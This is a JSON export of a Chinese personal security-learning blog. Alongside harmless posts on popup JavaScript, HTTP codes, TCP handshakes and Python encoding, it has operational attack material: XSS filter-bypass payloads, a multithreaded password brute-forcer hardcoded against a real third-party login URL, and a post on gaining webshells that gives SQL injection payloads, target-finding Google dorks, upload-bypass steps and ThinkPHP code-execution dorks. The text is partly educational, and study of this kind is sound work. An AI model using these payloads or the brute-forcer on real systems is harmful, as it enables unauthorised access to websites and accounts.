[{"title":"ceshi","date":"2017-05-04T07:01:41.000Z","path":"2017/05/04/ceshi/","text":"ceshi","tags":[{"name":"随笔","slug":"随笔","permalink":"http://yoursite.com/tags/随笔/"}]},{"title":"花式弹窗","date":"2017-01-11T08:10:38.000Z","path":"2017/01/11/花式弹窗/","text":"花式弹窗直跳第一种123&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;window.location.href=&quot;login.php?backurl=&quot;+window.location.href;&lt;/script&gt; 第二种1234&lt;script language=&quot;javascript&quot;&gt;alert(&quot;返回&quot;);window.history.back(-1);&lt;/script&gt; 第三种123&lt;script language=&quot;javascript&quot;&gt;self.location=&quot;login.php&quot;;&lt;/script&gt; 第四种1234&lt;script language=&quot;javascript&quot;&gt;alert(&quot;请登陆&quot;);top.location=&quot;login.php&quot;;&lt;/script&gt; 第五种1234567&lt;script language=&quot;javascript&quot;&gt;function logout()&#123;alert(&quot;你确定要注销身份吗？&quot;);window.location.href=&quot;login.php&quot;&#125;&lt;/script&gt;&lt;input type=&quot;button&quot; onclick=&quot;logout()&quot; value=&quot;注销&quot;/&gt; 选跳第一种12345678&lt;script language=&quot;javascript&quot;&gt;function logout()&#123;if (confirm(&quot;你确定要注销身份吗？是－选择确定，否-选择取消&quot;))&#123;window.location.href=&quot;login.php&quot;&#125;&#125;&lt;/script&gt;&lt;input type=&quot;button&quot; onclick=&quot;logout()&quot; value=&quot;注销&quot;/&gt; 杂跳第一种延迟自动跳转12&lt;meta http-equiv=&quot;Refresh&quot; content=&quot;5; url=http://www.rockpile.me&quot; &gt;5表示5秒后跳转，也可以直接设置为0， 第二种按钮式跳转1&lt;INPUT name=&quot;pclog&quot; type=&quot;button&quot; value=&quot;来嘛&quot; onClick=&quot;location.href=&apos;login.php&apos;&quot;&gt; 第三种直接跳转式123456789101112131415161718192021&lt;script&gt;window.location.href=&apos;login.php&apos;;&lt;/script&gt;&lt;SCRIPT LANGUAGE=&quot;javascript&quot;&gt;window.open (&apos;page.html&apos;, &apos;newwindow&apos;, &apos;height=100, width=400, top=0, left=0, toolbar=no, menubar=no, scrollbars=no, resizable=no, location=no, status=no&apos;)&lt;/SCRIPT&gt;&lt;SCRIPT LANGUAGE=&quot;javascript&quot;&gt; js脚本开始；window.open 弹出新窗口的命令；&apos;page.html&apos; 弹出窗口的文件名；&apos;newwindow&apos; 弹出窗口的名字（不是文件名），非必须，可用空&apos;&apos;代替；height=100 窗口高度；width=400 窗口宽度；top=0 窗口距离屏幕上方的象素值；left=0 窗口距离屏幕左侧的象素值；toolbar=no 是否显示工具栏，yes为显示；menubar，scrollbars 表示菜单栏和滚动栏。resizable=no 是否允许改变窗口大小，yes为允许；location=no 是否显示地址栏，yes为允许；status=no 是否显示状态栏内的信息（通常是文件已经打开），yes为允许；&lt;/SCRIPT&gt; js脚本结束 第四种函数控制弹出窗口12345678910111213&lt;script LANGUAGE=&quot;JavaScript&quot;&gt;function openwin() &#123;window.open (&quot;login.php&quot;, &quot;newwindow&quot;, &quot;height=100, width=100, top=0, left=0,toolbar=no, menubar=no, scrollbars=no, resizable=no, location=no, status=no&quot;)&#125;&lt;/script&gt;方法一：&lt;body onload=&quot;openwin()&quot;&gt;浏览器读页面时弹出窗口；方法二：&lt;body onunload=&quot;openwin()&quot;&gt; 浏览器离开页面时弹出窗口；方法三：用一个连接调用：&lt;a href=&quot;#&quot; onclick=&quot;openwin()&quot;&gt;打开一个窗口&lt;/a&gt;PS：使用的“#”是虚连接。方法四：用一个按钮调用：&lt;input type=&quot;button&quot; onclick=&quot;openwin()&quot; value=&quot;打开窗口&quot;&gt; 第五种主窗口打开百度，同时弹出小窗口login.php1234567&lt;script language=&quot;javascript&quot;&gt;function openwin() &#123;window.open(&quot;login.php&quot;,&quot;&quot;,&quot;width=200,height=200&quot;)&#125;&lt;/script&gt;加入&lt;body&gt;区：&lt;a href=&quot;https://www.baidu.com&quot; onclick=&quot;openwin()&quot;&gt;open&lt;/a&gt; 第六种自动关闭弹窗1234567将下列代码放入login.php的&lt;head&gt;中&lt;script language=&quot;JavaScript&quot;&gt;function closeit() &#123;setTimeout(&quot;self.close()&quot;,5000) //毫秒&#125;&lt;/script&gt;然后用login.php中的&lt;body&gt;替换成&lt;body onload=&quot;closeit()&quot;&gt;,这句代码的作用就是调用关闭窗口的代码。5秒关闭。 第七种在弹窗中加上关闭按钮（例:放入login.php代码中）123&lt;FORM&gt;&lt;INPUT TYPE=&apos;BUTTON&apos; VALUE=&apos;关闭&apos; onClick=&apos;window.close()&apos;&gt;&lt;/FORM&gt; 第八种在一个页面上实现弹窗（自行测试，体会其中不同的地方）12345678910111213141516171819202122html&gt;&lt;head&gt;&lt;SCRIPT LANGUAGE=&quot;JavaScript&quot;&gt;function openwin()&#123;OpenWindow=window.open(&quot;&quot;, &quot;newwin&quot;, &quot;height=250,width=250,toolbar=no,scrollbars=&quot;+scroll+&quot;,menubar=no&quot;);//写成一行OpenWindow.document.write(&quot;&lt;TITLE&gt;例子子&lt;/TITLE&gt;&quot;)OpenWindow.document.write(&quot;&lt;BODY BGCOLOR=#ffffff&gt;&quot;)OpenWindow.document.write(&quot;&lt;h1&gt;Hello!&lt;/h1&gt;&quot;)OpenWindow.document.write(&quot;这里可以添加超链接嘛？&quot;)OpenWindow.document.write(&quot;&lt;/BODY&gt;&quot;)OpenWindow.document.write(&quot;&lt;/HTML&gt;&quot;)OpenWindow.document.close()&#125;&lt;/SCRIPT&gt;&lt;/head&gt;&lt;body&gt;&lt;a href=&quot;#&quot; onclick=&quot;openwin()&quot;&gt;打开一个窗口&lt;/a&gt;&lt;input type=&quot;button&quot; onclick=&quot;openwin()&quot; value=&quot;打开窗口&quot;&gt;&lt;/body&gt;&lt;/html&gt; 第九种利用cookie控制弹窗只出现一次12345678910111213141516171819202122232425262728&lt;script&gt; window.onload=loadpopup(); function openwin()&#123; window.open(&quot;login.php&quot;,&quot;&quot;,&quot;width=200,height=200&quot;) &#125; //弹窗 function get_cookie(Name) &#123; var search = Name + &quot;=&quot; var returnvalue = &quot;&quot;; if (document.cookie.length &gt; 0) &#123; offset = document.cookie.indexOf(search) if (offset != -1) &#123; offset += search.length end = document.cookie.indexOf(&quot;;&quot;, offset); if (end == -1) end = document.cookie.length; returnvalue=unescape(document.cookie.substring(offset, end)) &#125; &#125; return returnvalue; &#125; function loadpopup()&#123; if (get_cookie(&apos;popped&apos;)==&apos;&apos;)&#123; openwin() document.cookie=&quot;popped=yes&quot; &#125; &#125;&lt;/script&gt;","tags":[{"name":"代码小知识","slug":"代码小知识","permalink":"http://yoursite.com/tags/代码小知识/"}]},{"title":"HTTP相应消息中常见的状态消息","date":"2016-11-29T05:32:43.000Z","path":"2016/11/29/HTTP相应消息中常见的状态消息-0/","text":"HTTP 相应消息中常见的状态消息成功200 ：成功，服务器正常返回网页201 ：请求成功并且服务器常见了新的资源203 ：服务器已成功处理了请求，但返回的信息可能来自另外一个源205 ：服务器成功处理了请求，但没有返回任何内容 重定向301 ：永久移动，服务器返回此相应时，会自动跳转到新位置304 ：未修改，自从上次请求后，请求的网页未修改过，服务器返回此305 ：使用代理，请求者只能使用代理访问请求的网页，如果服务器返回此相应，还表示请求者应使用代理 请求错误400 ：错误请求，服务器不理解请求的语言。401 ：请求要求身份验证，对于需要登录的网页，服务器可能会返回此相应403 ：服务器拒绝请求404 ：未找到，服务器找不到请求的网页。例如服务器上不存在的网页经常会返回此代码。405 ：禁用请求中指定的方法408 ：服务器等会请求时发生超市410 ：如果请求的资源以永久删除，服务器就会返回此相应413 ：服务器无法处理请求，因为请求实体过大，超出服务器的处理能力415 ：不支持的媒体类型，请求的格式不受请求页面的支持 服务器错误500 ：服务器内部错误，服务器遇到错误，无法完成请求501 ：服务器无法识别方法请求方法时可能会返回此代码502 ：错误网关，服务器作为网关或代理，从上游服务器收到无效相应503 ：网关超时，服务器作为网关或代理，但是没有及时从上游服务器收到请求505 ：http版本不受支持，服务器不支持请求中所用的http协议版本","tags":[{"name":"计算机网络基础","slug":"计算机网络基础","permalink":"http://yoursite.com/tags/计算机网络基础/"}]},{"title":"了解XSS","date":"2016-11-21T03:16:43.000Z","path":"2016/11/21/了解XSS/","text":"了解XSS前奏前两天群里发个几道题，关于xss，很惭愧，没有做出来，之前对xss的理解仅限于弹框，打cookie，具体怎么操作还不怎么熟练，索性整理了一下，以便自己回来查阅。 XSS 简介 攻击者利用 “html注入” 篡改了网页，插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击。因为xss破坏力大，而且产生场景复杂。所以被称为客户端web安全的头号大敌。 第一种 反射性XSS用户正常登录web应用程序，登录成功会得到一个cookie，攻击者将含有攻击代码的url发送给被攻击人，用户点开链接，web应用程序会执行该url中所含的攻击代码，用户cookie被发送出去。这个例子，属于反射型xss. 只是简单的把用户输入的数据“反射”给浏览器，也就是说，黑客需要诱使“用户”点击一个恶意链接，才能攻击成功。同时反射型xss 也叫做“非持久型xss”。 第二种 存储型XSS顾名思义，存储型xss会把用户输入的数据“存储”在服务器中端，这种xss具有较强的稳定性。常见的场景：黑客写下一篇包含恶意js代码的文章，所有访问该博客文章的用户，都会在他们自己的浏览器上执行这段代码，黑客把恶意代码保存到服务器，所以这种xss攻击又叫做“存储型xss”. 第三种 dombased XSS通过修改页面的dom 节点形成的xss,称之为dom based xss ,该种xss 不是通过恶意脚本是否存储服务器来判断，不过从效果上来说也是反射型xss XSS 简单绕过（附上代码）第一种情况（无过滤）模拟代码 &lt;?php $input = $_GET[&quot;par&quot;]; echo &quot;&lt;div&gt;&quot;.$input.&quot;&lt;/div&gt;&quot;; ?&gt; 构造url: 127.0.0.1/1.php?par=test 正常情况我们会得到一个返回test的页面如果我们在参数地方输入的是 &lt;script&gt;alert(/xss/)&lt;/script&gt; 这里将会出现xss弹框 查看下源代码 发现是&lt;div&gt;&lt;scRipt&gt;alert(/xss/)&lt;/scRipt&gt;script&gt;&lt;/div&gt; 第二种情况（过滤script标签）&lt;?php $input = $_GET[&quot;par&quot;]; $input = preg_replace(&quot;/&lt;script&gt;/&quot;,&quot;&quot;, $input); $input = preg_replace(&quot;/&lt;\\/script&gt;/&quot;, &quot;&quot;, $input); echo &quot;&lt;div&gt;&quot;.$input.&quot;&lt;/div&gt;&quot;; ?&gt; 使用原来的url: 127.0.0.1/1.php?par=&lt;script&gt;alert(/xss/)&lt;/script&gt; 我们会发现这里不能出现弹框解决方法：构造url: http://127.0.0.1/1.php?par=&lt;sCriPt&gt;alert(/xss/)&lt;/sCripT&gt; 出现弹框 第三种情况（过滤大小写script标签）&lt;?php $input = $_GET[&quot;par&quot;]; $input = preg_replace(&quot;/&lt;script&gt;/i&quot;,&quot;&quot;, $input); $input = preg_replace(&quot;/&lt;\\/script&gt;/i&quot;, &quot;&quot;, $input); echo &quot;&lt;div&gt;&quot;.$input.&quot;&lt;/div&gt;&quot;; ?&gt; 使用原来的url: http://127.0.0.1/1.php?par=&lt;sCript&gt;alert(/xss/)&lt;/scRipt&gt; 又不能出现弹框了 解决方法：构造url: http://127.0.0.1/1.php?par=&lt;img src=1 onerror=alert(/xss/)&gt; 可以弹框 XSS圆括号被过滤的情况下怎么绕过&lt;img src=1111 onerror=alert&amp;lpar;1&amp;rpar;&gt; &lt;img src=1111 onerror=jacascript:alert&amp;#x28;&amp;#x29&gt; &lt;a href=”javascript:alert&amp;#40/1/&amp;#41”&gt;axxx&lt;/a&gt; &lt;svg&gt;&lt;script&gt;alert&amp;#40 1&amp;#41 &lt;/script&gt;&lt;/svg&gt; &lt;img src=1 onerror=alert#40;1&amp;#41;&gt; &lt;img src=x onerror=alert`1`&gt; XSS长期占据top10前排，危害不言而喻，该文章只是对xss的一个简单了解，后续还需要不断的学习。 参考资料： 《赛克社区》《白帽子讲web安全》","tags":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/tags/web安全/"}]},{"title":"GitHub个人博客背景设置","date":"2016-11-17T03:09:02.000Z","path":"2016/11/17/GitHub个人博客背景设置/","text":"设置背景图片网上找了一些说明，自己整理了一下发了出来 首先找到自己喜欢的图片放到主题下面images里面参考路径/hexo/themes/next/source/images也可以放到另外一个images(存放文章图片的地方)参考路径/hexo/source/images图片放到这两个文件夹下面都行 打开文件index.styl参考路径/themes/next/source/css/_schemes/Pisces也可以是另外两个 mist或者muse 更改配置在首行加入body { background:url(/images/11.jpg); background-attachment:fixed; background-size:100% 100%;} backgroup 是css中设置背景的一个属性。简单介绍下backgroup-size 规定背景图片的尺寸backgroup-attachment 规定背景图片是否国定或者随页面而滚动backgroup-origin 固定背景图片的定位区域…. 有兴趣的可以自行学习http://www.w3school.com.cn/cssref/pr_background.asp到这里背景图片已经设置好了，值得注意的是图片选取尽量使用分辨率大点的，否则可能会模糊，降低视化效果。这个看个人。","tags":[{"name":"生活","slug":"生活","permalink":"http://yoursite.com/tags/生活/"}]},{"title":"Pip更新","date":"2016-11-16T08:38:10.000Z","path":"2016/11/16/Pip更新/","text":"pip最新版下载网址：https://pypi.python.org/pypi/pip#downloads 下载好之后解压到一个目录，（建议python/）打开命令行 python setup.py install 安装完了之后记得设置环境变量 大功告成。ps:我不会告诉你们中间发生了什么的。 囧！","tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"鸡汤","date":"2016-11-10T06:03:56.000Z","path":"2016/11/10/鸡汤/","text":"菜鸟hi ,boby 近期感到有点失落，技术层面的东西有一段时间没有学习了，每天都在重复做一些无关紧要的事情，浪费时间，消磨生命，靠着一点点的自我满足来蒙骗自己，还记得当初你热爱的东西吗？是的，这不是你 ，开始改变吧 对的 不管期间会发什么，开始吧你需要有一个计划，然后去执行它没有什么能阻拦我学习日益消瘦","tags":[{"name":"生活","slug":"生活","permalink":"http://yoursite.com/tags/生活/"}]},{"title":"补天厂商爬虫(正则)","date":"2016-09-02T00:14:11.000Z","path":"2016/09/02/补天厂商爬虫-正则/","text":"厂商小爬虫思路：打开网页，使用规则进行匹配，输出code: #!/usr/bin/env python #-- coding=utf-8 -- import requests import re def gethtml(url): page = requests.get(url) page.encoding = page.apparent_encoding html = page.text r = re.compile(r&apos;&lt;td align=&quot;left&quot; height=&quot;30&quot; style=&quot;padding-left:20px;&quot;&gt;&lt;a href=&quot;.*&quot;&gt;(.*)&lt;/a&gt;&lt;/td&gt;&apos;) text = r.findall(html) for firm in text: print firm def main(): for x in range(1): html = &quot;https://butian.360.cn/company/lists/page/&quot; + str(x) gethtml(html) if __name__ == &apos;__main__&apos;: main() print &apos;over&apos;","tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"简单目录遍历以及文件查找","date":"2016-08-30T00:41:27.000Z","path":"2016/08/30/简单目录遍历以及文件查找/","text":"目录遍历思想：判断目录是否存在，遍历并与绝对路径（相对路径）相加，输出code:#!/usr/bin/env python# --coding = utf-8 --import os def dirlist(path): # 判断是否存在该文件，不存在就离开，存在遍历追加到列表中并和绝对路径结合，返回该值 if not os.path.exists(path): print u&quot;no file&quot; exit() else: filelist = os.listdir(path) # print filelist fpath = os.path.abspath(path) # print fpath allfile = [] for filename in filelist: allfile.append(fpath + &apos;\\\\&apos; + filename) return allfile def main(): # 主函数，遍历当前目录，并将结果写入listfile.txt allfile = dirlist(&apos;.&apos;) for i in allfile: f = open(&apos;listfile.txt&apos; ,&apos;a+&apos;) f.write(&apos;allfile[&apos;+i+&apos;]\\n&apos;) f.close() if name == ‘main‘: main() print ‘over’ 查找思想：利用模块查找，并且输出（可加上路径）#!/usr/bin/ven python# --coding = utf-8 -- # D:\\python\\www\\123import globimport os def look(path): # 判断是否存在，获取一个遍历对象 if not os.path.exists(path): print &apos; no file&apos; exit() else: pa = os.path.abspath(path) f = glob.iglob(path) filelist = [] for i in f: filelist.append(pa.rstrip(path) + i) return filelist def main(): # 主函数 ，查找到该文件 # filelist = look(&apos;123&apos;) file = look(&apos;123&apos;) # 列表 for x in file: print x if name == ‘main‘: main()","tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"简单多线程弱口令爆破","date":"2016-08-30T00:16:48.000Z","path":"2016/08/30/简单多线程弱口令爆破/","text":"简单多线程爆破小工具思想：遍历字典存放到字典中，访问url并且利用返回包或者cookie 来判断是否正确，添加线程 ，最后输出code:#!/usr/bin/env python# -- coding=utf-8 --import sysimport requestsimport Queueimport timeimport threading def filepass(passfi ,queue): # 将字典传入队列中 f = open(passfi ,&apos;r&apos;) for x in f.readlines(): # 将字典里的密码已行单位遍历出来 queue.put(x.strip()) # print type(queue) return queue def address(username ,listob): # 通过字典访问url，判断返回结果并且输出正确的密码 url = &apos;http://ch3.cttcn.cn/ht/login.php&apos; if not listob.empty(): # 判断该队列是否为空，如果不为空，则将账户名传入其中 listob.put(username) while not listob.empty(): # for i in range(listob.qsize()): # [0,1,2,3,4] 判断一下队列的长度，并且一个一个的取出来赋值给 x x = listob.get() data = {&apos;gotopage&apos;:&apos;&apos; ,&apos;dopost&apos;:&apos;login&apos; ,&apos;adminstyle&apos;:&apos;newdedecms&apos; ,&apos;userid&apos;:username ,&apos;pwd&apos;:x ,&apos;sm1&apos;:&apos;&apos;} addre = requests.post(url ,data) addre.encodig = addre.apparent_encoding # 进行源代码的编码定义 if addre.text.find(u&apos;document.write(&quot;你的密码错误!&quot;)&apos;) == -1 and addre.text.find(u&apos;document.write(&quot;你的用户名不存在!&quot;)&apos;) == -1 : print u&apos;succes&apos; ,x # print len(addre.cookies) 可以利用基于cookie 对正确密码进行判断 listob.queue.clear() break else: print u&apos;pswd error&apos; # break # print len(addre.cookies) # end_time = time.time() # 计算结束时间 # print u&apos;总用时: %fs&apos; %(end_time - start_time) else: print u&apos;密码本为空&apos; def thread1(username ,listob): # 线程 thread = [] start_time = time.time() #计算开始时间 for x in range(10): t = threading.Thread(target = address ,args = (username ,listob)) thread.append(t) t.setDaemon(True) # for y in thread: # y.start() t.start() for x in thread: x.join() end_time = time.time() # 计算结束时间 print u&apos;总用时: %fs&apos; %(end_time - start_time) def main(): # 主函数 try: username = sys.argv[1] pass_file = sys.argv[2] #传入一个字典 except Exception as e: print &apos;pleave input python hudra2.py username pass_file&apos; ,e exit() # username = &apos;admin&apos; # pass_file = &apos;pa.txt&apos; que = Queue.Queue() # 建立一个队列 file = filepass(pass_file ,que) thread1(username ,file) # urll = address(username ,file) if name == ‘main‘: main()","tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"Python爬虫小实验","date":"2016-08-25T06:45:25.000Z","path":"2016/08/25/Python爬虫小实验/","text":"Python小实验【0x01】实验目的：本次实验目标是补天厂商列表，利用requestes库的元素进行网页源代码的抓取，采用字符串分割的方式获取到我们想要的部分 【0x02】代码#!/usr/bin/env python # -*- conding=utf-8 -*- import requests import re def gethtml(url, list1): page = requests.get(url) page.encoding = page.apparent_encoding html = page.text # return html for i in html.split(&apos;&lt;td align=&quot;left&quot; height=&quot;30&quot; style=&quot;padding-left:20px;&quot;&gt;&apos;)[1:]: buf = i.split(&apos;&gt;&apos;) # print buf[1][:-3],buf[4][:-4] dict1 = {&quot;name&quot;:buf[1][:-3],&quot;url&quot;:buf[4][:-4]} list1.append(dict1) def main(): list1 = [] for x in range(10): html = &quot;https://butian.360.cn/company/lists/page/&quot; + str(x) gethtml(html, list1) for i in list1: date = i[&apos;name&apos;] + i[&apos;url&apos;] f = open(&apos;butian.txt&apos;, &apos;a+&apos;) f.write(date.encode(&apos;gbk&apos;,&apos;ignore&apos;)) f.write(&apos;\\n&apos;) f.close() if __name__ == &apos;__main__&apos;: main() print &apos;over&apos; 【0x03】效果图","tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"Python编码问题","date":"2016-08-23T08:12:17.000Z","path":"2016/08/23/Python编码问题/","text":"Python编码问题【0x01】提前须知Unicode与str的关系字符串有str和unicode两种类型，str有各种编码区别（utf-8,gbk,big5..）,unicode是没有编码的标准形式。Unicode通过编码转化成str,str通过解码转化成unicodeEncode 编码Decode 解码 【0x02】举个栗子：我们来利用python获取一所大学的网页代码从网站源代码头部和信息 可以得知该网页是什么编码 代码1 #!/usr/bin/env/python Import requests resp = requests.get(&quot;http://www.nyist.edu.cn&quot; ) resp.encoding = resp.apparent_encoding html = resp.text title = html.encode(&apos;gbk&apos;,&quot;ignore&quot;) ti = title.split(&apos;&lt;/title&gt;&apos;)[0] print &quot;title:&quot; + ti 我们调用python request库 进行爬取网页源代码，我们将resp这个对象的编码设置为响应包中的编码，这里有一个小陷阱，下面会介绍到，接着使用.text属性，转换成gbk编码，拆解得到想要的源码输出 代码2 #!/usr/bin/env python import requests resp = requests.get(&quot;http://www.nyist.edu.cn&quot;) resp.encoding = resp.apparent_encoding html = resp.text title = html.split(&apos;&lt;title&gt;&apos;)[1].split(&apos;&lt;/title&gt;&apos;)[0] #print type(title) print u&quot;title:&quot; + title print u&quot;len:&quot; + str(len(title)) 同样的道理 ，与例一不同的是这里全部使用的unicode编码，最后输出print u”title:” + title就是将字符串”title”转换为unicode打印出来，前面加u 代码3 #!/usr/bin/env python import requests resp = requests.get(&quot;http://www.nyist.edu.cn&quot;) print resp.encoding html = resp.text.encode(&quot;ISO-8859-1&quot;,&apos;ignore&apos;) title = html.split(&apos;&lt;title&gt;&apos;)[1].split(&apos;&lt;/title&gt;&apos;)[0] print &quot;title:&quot; + titl print &quot;len:&quot; + str(len(title)) 这里有一个陷阱，html = resp.text.encode(“ISO-8859-1”,’ignore’) 这个ISO-8859-1 是怎么的出来的，在我们获取的返回包中 我们使用encoding 查看格式，显示的ISO ，为什么会出现这样的原因，因为默认的编码识别很简单，直接从响应头里面的content-type中获取，如果存在charset,则可以正确识别，如果不存在，charset但是存在text就认为是ISO-8859-1 见utils.py代码 def get_encoding_from_headers(headers): “””Returns encodings from given HTTP Header Dict. :param headers: dictionary to extract encoding from. &quot;&quot;&quot; content_type = headers.get(&apos;content-type&apos;) if not content_type: return None content_type, params = cgi.parse_header(content_type) if &apos;charset&apos; in params: return params[&apos;charset&apos;].strip(&quot;&apos;\\&quot;&quot;) if &apos;text&apos; in content_type: return &apos;ISO-8859-1&apos; 所以我们这里encoding出啦的iso是不正确的 所以在cmd中输出是乱码，但是在编辑器中可以正常输出，是因为编辑器是本身是utf-8，网页源代码也是utf-8模式，我们encode解码之后回到utf-8模式，整好符合编辑器的编码模式，即可成功，但是cmd命令行中是gbk ，所以会出现乱码。","tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"Tcp/Ip协议三次握手和四次挥手","date":"2016-08-17T00:56:42.000Z","path":"2016/08/17/Tcp-Ip协议/","text":"Tcp/ip 协议中的三次握手和四次挥手【0x01】提前了解：ACK: tcp协议规定，只有ACK=1时有效，也规定链接建立后所有发送的报文的ACK必须为1SYN(synchronization): 在连接建立时用来同步序号，当SYN=1而ACK=0时，表明这是一个连接请求报文。对方若同意建立连接，则应在相应报文中是SYN=1和ACK=1。所以，所以SYN=1就表示一个连接请求或链接接收报文FIN(finis) :即完，终结的意思，用来释放一个连接。当FIN=1时，表明此报文段的发送方的数据已经发送完毕，并要求释放链接 【0x02】详细流程：三次握手的过程： 首先client发出请求连接即 SYN=1 ACK=0 ,tcp规定SYN=1 时不能携带数据，但要消耗一个序号，因此声明自己的序号是seq=x ,然后呢，server进行回复确认，即给client说 : SYN=1， ACK=1，seq=y ,ack=x+1 。接着client对server确认一下说 ACK=1,seq=x+1,ack=y+1 .就这样，建立了链接 思考： 四次挥手的过程：中断连接端可以是client端，也可以是server端。假设client端发起中断连接请求，也就是发送FIN报文。Server端接到FIN报文后，说的是“我client没有数据要发给你了，但是如果你还有数据没有发送完成，则不必急着关闭socket,可以继续发送数据。”然后server端就告诉client：“你的请求我收到了，但是我没准备好，请你继续等我的消息”，这个时候client就是FIN_WAIT状态，继续等待server端的FIN报文，当server端确定数据已发送完成，则向client端发送FIN报文告诉client端“我这边数据发完了，准备关闭连接了”client接到FIN报文后，知道可以关闭连接了，但是他不相信网络，怕server端不知道要关闭，所以发送ACK后进入TIME_WAIT状态，如果server端没有收到ACK则可以重传，server端接到ACK后，就知道可以断开连接了，client端等待了2MSL后依然没有收到回复，则证明server端正常关闭，好了，我也可以关闭了，就这样tcp连接就关闭了。 注意在TIME_WAIT状态中，如果client端最后一次发送的ack丢了，他将重新发送。TIME_wait状态中所需要的时间是依赖于实现方法，典型的值为30秒，1分钟，2分钟。等待之后连接正式关闭，并且所有的资源（包括端口号）被释放。 【0x03】扩展：1：为什么连接是3次握手，而关闭的时候确实4次？因为server收到client的syn请求连接后，可以直接回复SYN+ACK报文，ACK用来应答，SYN用来同步。但是关闭的时候，当server收到FIN报文时，可能不会立即关闭SOCKET，所以只能先回复一个ACK报文，告诉client端，“我收到你发的FIN报文了”，等我的所有报文都发送完了，我才能发送FIN报文，所以需要4次。 【0x04】全览图:","tags":[{"name":"计算机网络基础","slug":"计算机网络基础","permalink":"http://yoursite.com/tags/计算机网络基础/"}]},{"title":"常见几种获得webshell方式","date":"2016-08-15T07:12:02.000Z","path":"2016/08/15/常见几种获得webshell方式/","text":"常见几种获得web shell总结0x01: 了解web shellWeb 的含义很明显是开放web服务Shell 的含义是取得对服务器某种程度上操作的权限。Web shell 常常被称为入侵者通过网站端口对网站服务器的某种程度上的权限，被称为网站的后门工具。 0x02: 常见方法总览Sql注入（mysql数据库具有file权限）获取webshell上传漏洞获取webshell任意命令执行获取webshell任意代码执行获取webshell任意文件包含获取webshell后台相关功能获取webshell 0x03：逐个分析0x03.1：Sql注入获取webshell谷歌语法： inurl:php?id=公司/医院漏洞分类：可联合查询，报错注入，布尔型注入，基于时间，等等漏洞思路：找到一个网站，测试能否闭合，判断显示位，使用语句查询需要的内容漏洞流程： 可联合查询特征:有显示位?id=1’?id=-1 order by 3 –?id=-1 union select 1,2,version() –?id=-1 union select group_count(distinct+tables_schema) from information_schema.tables –+?id=-1 union select group_count(distinct+table_name) from information_schema.tables –+?id=-1 union select group_count(distinct+column_name) from information_schema.columns –+ 报错型数据库*特征:无显示位，有输出报错信息?id=1’?id=1’ + and(select 1 from (select count(),concat((select(concat(0x7e,user(),0x7e))) from information_schema.tables limit(0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) –+ 注：报错型数据库查询语句是一套固定格式，其中我们需要查询的内容语句和联合查询一样，只需要替换其中的user()即可布尔型注入特征：没有显示位，也没有数据库出错信息提前掌握：exists() 用于检查是否会返回一行数据Ascii() 返回字符串str最左边的asc码Substr() 返回一个字符串的字串 ?id=1’ and (select length((select database()))&gt;8) –+ 返回正确证明长度为8?id=1’ and(select ascii(substr((sellect database()),1,1)) &gt;115) –+ 判断第一个字符的asc码为115?id=1’ and(select ascii(substr((select database()),2,1)) &gt; 101) –+ 判断第二个字符的asc码为101?id=1’ and(select (ascii(substr((select tables_name from information_schema.tablles where table_schema=’security’ limit 1,1),1,1))) &gt; 114) –+ 该security库中 第二个表的表名第一个字的ascii码为114limit 1,2 其中1表示第二行，2表示取2个信息 防御：数据库连接账号不适用root 权限Php报错模式关闭Mysql账号没有权限向网站跟目录写文件 0x03.2：上传漏洞获取webshell判断编辑器上传，还是程序员脚本上传如果是编辑器，则百度查看该版本编辑器版本漏洞如果是程序员脚本上传：上传一个正常的图片上传一个正常的jpg图片，burp拦截，修改后缀php(作用：绕前端，文件类型检测，meme类型)上传一个争创的jpg图片，burp拦截，00截断判断服务器是什么类型，web服务器程序，什么类型，版本多少利用解析漏洞（apache扩展名） 0x03.3：任意命令执行获取webshell注：手工麻烦，明白原理就好，一般使用工具进行测试测试工具 k8网站绝对路径Pwd 获取当前工作路径（linux）注意：Apache 对网站目录写文件：如果不可写，找上传目录，一般apache都有些权限防御：修补任意命令执行获取webshell扩展：dedecms漏洞google语法：Inurl:”/dade”管理目录测试步骤：弱口令登录，上传点，上传路径，那shell防御：移除install目录 0x03.4：任意代码执行获取webshell谷歌语法：intext:thinkphp intext:”Fast &amp; Simple OOP PHP Framework” intext:”2.1”Thinkphp intitle:系统发生错误漏洞成因：几种常用语言，将字符串转化为代码去执行的相关函数Php中 eval() assert() 函数Python中 exec() 函数Thinkphp 框架任意代码执行漏洞漏洞分类：执行代码的函数 eval() assert()callback函数 preg_replace + /e 模式反序列化可能导致代码执行 unserialize() （反序列化函数）文件包含漏洞 导致任意代码执行漏洞思路：找到网站后检测是否存在该漏洞，使用phpinfo()或者{${phpinfo()}},查看敏感文件，上传一句话漏洞流程：详见 arbitrary code execution （任意代码执行漏洞）防御：1下载官方的补丁2将/thinkphp/lib/core/dispatcher.class.php文件中的$res=preg_replace(‘@(w+)’.$depr.’([^’.$depr.’\\/]+)@e’,’$var[\\’\\1\\’]=”\\2”;’, implode($dep改为$res=preg_replace(‘@(w+)’.$depr.’([^’.$depr.’\\/]+)@e’,’$var[\\’\\1\\’]=”\\2’;’, implode($dep将preg_replace第二个参数中的双引号改为单引号，防止其中的php变量语法被破解解析3 eval函数使用json 保存数组使用eval，用正则严格判断输入的数据格式，字符处，用单引号包裹可控代码，开始插入前addslashes()$data=addslashes($data); eval(“\\$data=trim(‘$data’)”) 扩展：反序列化漏洞 0x03.5：任意文件包含获取webshell漏洞发现:无通用性方法， 特定的cms,特定的版本可能存在漏洞， web漏洞扫描器扫描（awvs）漏洞成因:在引入文件时，引用的文件名，用户可控，其中因为程序员的疏忽，并没有对传入的文件名进行合理的校验，或者校验被绕过，操作了预想之外的文件，就可能导致意外的文件泄露甚至是恶意的代码注入。被包含的文件在服务器本地时，就叫做本地文件包含漏洞，被包含的文件在第三方服务器上时，就形成了远程文件包含漏洞。条件：（php常见函数）include() include_once() require() 